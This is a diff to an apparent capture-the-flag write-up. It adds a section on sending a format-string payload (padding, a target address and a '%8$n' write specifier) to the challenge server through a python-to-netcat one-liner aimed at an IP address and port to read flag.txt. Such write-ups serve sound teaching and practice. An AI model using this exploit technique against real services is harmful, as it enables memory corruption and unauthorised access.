@@ -112,3 +112,17 @@ payload = (
     b"A" * 12 +           # 12 bytes of counting padding (32 total)
     b"%8$n"               # Write specifier for Arg 8
 )
+```
+
+## 5. Remote Exploit and Getting the Flag 🚀
+
+Ok, it seems to work, it's time to send the payload to the challenge server so it gives us the content of `flag.txt`.
+
+For this, I used `netcat` (`nc`) to connect to the server. I added a `\n` (newline) to the end of the payload (vital to unblock `fgets` on the server).
+
+Final exploit command:
+```bash
+(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 2 + b"\x30\xa0\x04\x08" + b"A" * 12 + b"%8$n" + b"\n")') | nc 34.159.228.3 31232
+```
+![Connect to server](img/flag.png)
+
